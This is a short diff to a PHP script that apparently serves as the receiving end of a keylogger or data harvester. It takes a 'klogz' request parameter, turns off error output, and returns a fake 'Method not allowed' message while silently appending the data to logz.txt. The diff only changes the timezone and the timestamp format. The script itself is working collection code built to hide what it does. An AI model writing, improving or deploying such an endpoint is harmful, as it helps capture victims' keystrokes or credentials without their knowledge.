@@ -1,4 +1,5 @@
 <?php
+date_default_timezone_set('Asia/Manila');
 error_reporting(0);
 $log = $_REQUEST['klogz'];
 if($log == null or $log == ''){
@@ -6,7 +7,7 @@ if($log == null or $log == ''){
 }else{
 	echo "<h2>Method not allowed</h2>";
 	$file = fopen('logz.txt','a');
-	$data = "===================[ ".date("g:i A")." ]==================="."\r\n".$log."\r\n";
+	$data = "===================[ ".date("g:i:s A")." ]==================="."\r\n".$log."\r\n";
 	fwrite($file, $data);
 	fclose($file);
 }
